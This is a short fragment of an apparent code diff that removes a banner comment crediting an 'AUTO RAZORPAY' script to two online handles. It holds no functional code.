     }
 }
-
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
